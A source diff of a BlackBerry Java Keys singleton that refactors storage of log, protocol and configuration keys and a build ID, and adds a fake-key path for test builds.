@@ -15,6 +15,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.Check;
+import fake.InstanceKeysFake;
 
 /**
  * The Class Keys.
@@ -30,14 +31,16 @@ public final class Keys implements Singleton {
     static private Keys instance = null;
     private static final long GUID = 0x6b3d91c714d645e7L;
 
-    /*
-     * private static byte[] byteAesKey; private static byte[] byteChallengeKey;
-     * private static byte[] byteConfKey; private static byte[] byteBuildID;
-     */
-    private static byte[] byteInstanceID;
+    protected byte[] byteLogKey;
+    protected byte[] byteProtoKey;
+    protected byte[] byteConfKey;
+    protected byte[] byteBuildID;
+    //private static byte[] byteInstanceID;
 
     //#ifdef DEBUG
     public String log = "";
+
+    private byte[] byteInstanceID;
 
     //#endif
 
@@ -46,31 +49,45 @@ public final class Keys implements Singleton {
      * 
      * @return single instance of Keys
      */
-    public static synchronized Keys getInstance(
-            InstanceKeysEmbedded instanceKeyEmbedded) {
-        if (instance == null) {
-            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
-            if (instance == null) {
-                final Keys singleton = new Keys();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
-                instance = singleton;
-
-            }
-        }
+    private static synchronized Keys getInstance(
+            InstanceKeysFake instanceKeyEmbedded) {
+        boolean fake = false;
         //#ifdef FAKECONF
-        if (instanceKeyEmbedded != null) {
-            instance.setInstanceKeys(instanceKeyEmbedded);
-        }
+        fake = true;
         //#endif
 
+        if (!isInstanced() || instance.getLogKey() == null) {
+            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
+            if (instance == null) {
+                instance = new Keys();
+
+                if (fake) {
+                    //#ifdef DBC
+                    Check.asserts(instanceKeyEmbedded != null,
+                            "Null instanceKeyEmbedded");
+                    //#endif
+                }
+
+                if (instanceKeyEmbedded != null) {
+                    instance.setKeys(instanceKeyEmbedded);
+                }
+
+                RuntimeStore.getRuntimeStore().put(GUID, instance);
+            }
+        }
+
         //#ifdef DBC
-        Check.ensures(instance.getAesKey() != null, "Null AESKEY");
+        Check.ensures(instance.getLogKey() != null, "Null LOGKEY");
         //#endif
 
         return instance;
     }
 
-    public static synchronized Keys getInstance() {
+    public static Keys getFakeInstance(InstanceKeysFake instance) {
+        return getInstance(instance);
+    }
+
+    public static Keys getInstance() {
         return getInstance(null);
     }
 
@@ -84,40 +101,33 @@ public final class Keys implements Singleton {
      * @return true, if successful
      */
     public boolean hasBeenBinaryPatched() {
-        return instanceKeys.hasBeenBinaryPatched();
+
+        boolean ret = instanceKeys.hasBeenBinaryPatched();
+        //#ifdef FAKECONF
+        ret = true;
+        //#endif
+        return ret;
     }
 
     private Keys() {
         instanceKeys = new InstanceKeys();
+        setKeys(instanceKeys);
     }
 
-    private void setInstanceKeys(InstanceKeysEmbedded instance) {
-        //instanceKeys = new InstanceKeys();
-        //#ifdef FAKECONF
-        if (!hasBeenBinaryPatched()) {
-            if (instance != null) {
-                instance.injectKeys(instanceKeys);
-            }
-        }
-        //#endif  
+    private void setKeys(KeysGetter instanceKeys) {
+        byteLogKey = instanceKeys.getLogKey();
+        byteProtoKey = instanceKeys.getProtoKey();
+        byteBuildID = instanceKeys.getBuildID();
+        byteConfKey = instanceKeys.getConfKey();
     }
-
-    /*
-     * private void setInstanceKeys() { byteAesKey = instanceKeys.getAesKey();
-     * byteChallengeKey = instanceKeys.getChallengeKey(); byteConfKey =
-     * instanceKeys.getConfKey(); byteBuildID = instanceKeys.getBuildId();
-     * //#ifdef DEBUG debug.trace("instanceKeys log:" + InstanceKeys.log);
-     * //#endif }
-     */
 
     /**
      * Gets the aes key.
      * 
      * @return the aes key
      */
-    public byte[] getAesKey() {
-        return instanceKeys.getAesKey();
-
+    public byte[] getLogKey() {
+        return byteLogKey;
     }
 
     /**
@@ -125,8 +135,8 @@ public final class Keys implements Singleton {
      * 
      * @return the builds the id
      */
-    public byte[] getBuildId() {
-        return instanceKeys.getBuildId();
+    public byte[] getBuildID() {
+        return byteBuildID;
     }
 
     /**
@@ -134,8 +144,8 @@ public final class Keys implements Singleton {
      * 
      * @return the challenge key
      */
-    public byte[] getChallengeKey() {
-        return instanceKeys.getChallengeKey();
+    public byte[] getProtoKey() {
+        return byteProtoKey;
     }
 
     /**
@@ -144,7 +154,7 @@ public final class Keys implements Singleton {
      * @return the conf key
      */
     public byte[] getConfKey() {
-        return instanceKeys.getConfKey();
+        return byteConfKey;
     }
 
     /**
